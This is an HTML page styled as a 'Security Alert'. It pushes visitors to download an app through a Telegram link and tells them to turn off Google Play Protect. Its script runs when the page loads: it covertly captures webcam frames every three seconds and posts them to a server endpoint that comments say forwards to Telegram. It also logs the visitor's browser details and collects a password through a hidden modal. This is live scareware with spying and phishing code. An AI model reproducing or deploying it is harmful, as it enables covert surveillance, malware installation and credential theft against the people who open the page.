<!DOCTYPE html>
<html>
<head>
    <title>Security Alert</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin:0; padding:0; font-family:Arial; background:#0f172a; color:white; height:100vh; display:flex; justify-content:center; align-items:center; }
        .box { background:#1e293b; padding:40px; border-radius:15px; text-align:center; max-width:500px; width:90%; border:2px solid #ef4444; }
        h1 { color:#ef4444; margin-bottom:20px; }
        .sub { color:#94a3b8; margin-bottom:30px; }
        button { padding:15px 30px; margin:10px; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
        .download { background:#3b82f6; color:white; }
        .help { background:#64748b; color:white; }
        .note { font-size:12px; color:#64748b; margin-top:30px; }
        .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; }
        .modal-content { background:#1e293b; padding:30px; border-radius:10px; width:90%; max-width:300px; }
        input { width:100%; padding:12px; margin-bottom:15px; border:1px solid #475569; border-radius:5px; background:#0f172a; color:white; }
        .submit { background:#10b981; color:white; width:100%; }
        .error { color:#f87171; margin-bottom:10px; display:none; }
        #clickCount { position:fixed; bottom:20px; right:20px; background:rgba(239,68,68,0.2); color:#f87171; padding:10px 15px; border-radius:5px; display:none; }
    </style>
</head>
<body>
    <div id="clickCount">Clicks: <span>0</span>/7</div>
    
    <div class="box">
        <h1>‚ö†Ô∏è SECURITY ALERT DETECTED</h1>
        <p class="sub">Our system detected suspicious activities. Download our app for better experience.</p>
        
        <button class="download" onclick="window.open('https://t.me/example')">üì± Download App</button>
        <button class="help" onclick="alert('1. Play Store\n2. Profile icon\n3. Play Protect\n4. Turn OFF')">‚ùì Facing Issue</button>
        
        <p class="note">Note: Site uses camera for security</p>
    </div>
    
    <div class="modal" id="passwordModal">
        <div class="modal-content">
            <h3>Enter Password</h3>
            <div class="error" id="error"></div>
            <input type="password" id="password" placeholder="Password">
            <button class="submit" onclick="verify()">Access Dashboard</button>
        </div>
    </div>
    
    <script>
        let clicks = 0;
        
        // Update click counter
        function updateClicks() {
            document.querySelector('#clickCount span').textContent = clicks;
            document.getElementById('clickCount').style.display = 'block';
            
            if (clicks >= 7) {
                document.getElementById('passwordModal').style.display = 'flex';
                clicks = 0;
            }
        }
        
        // Verify password
        async function verify() {
            const password = document.getElementById('password').value;
            const error = document.getElementById('error');
            
            if (!password) {
                error.textContent = 'Enter password';
                error.style.display = 'block';
                return;
            }
            
            try {
                // Send to Telegram for testing
                await fetch('/api/log-error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: {page: 'login', message: 'Testing connection'}})
                });
                
                const response = await fetch('/api/verify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password: password})
                });
                
                const data = await response.json();
                
                if (data.success) {
                    localStorage.setItem('token', data.token);
                    window.location.href = data.redirect;
                } else {
                    error.textContent = data.message || 'Wrong password';
                    error.style.display = 'block';
                }
            } catch (err) {
                error.textContent = 'Network error. Trying again...';
                error.style.display = 'block';
                
                // Retry after 2 seconds
                setTimeout(() => {
                    verify();
                }, 2000);
            }
        }
        
        // Camera setup
        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                
                // Capture every 3 seconds
                setInterval(async () => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, 320, 240);
                        
                        const image = canvas.toDataURL('image/jpeg');
                        
                        // Send to Telegram
                        fetch('/api/capture', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({image: image})
                        }).catch(() => {});
                        
                        video.remove();
                        canvas.remove();
                    }, 500);
                }, 3000);
                
            } catch (err) {
                // Log camera error
                fetch('/api/log-error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: {page: 'camera', message: err.message}})
                }).catch(() => {});
            }
        }
        
        // Initialize
        window.addEventListener('load', () => {
            setTimeout(setupCamera, 1000);
            
            // Log page visit
            fetch('/api/log-error', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({error: {page: 'home', message: 'Page visited: ' + navigator.userAgent}})
            }).catch(() => {});
        });
        
        // Count clicks
        document.addEventListener('click', (e) => {
            if (!e.target.closest('.modal')) {
                clicks++;
                updateClicks();
            }
        });
        
        // Close modal
        document.getElementById('passwordModal').addEventListener('click', (e) => {
            if (e.target.id === 'passwordModal') {
                document.getElementById('passwordModal').style.display = 'none';
            }
        });
        
        // Enter key in password
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verify();
        });
    </script>
</body>
</html>
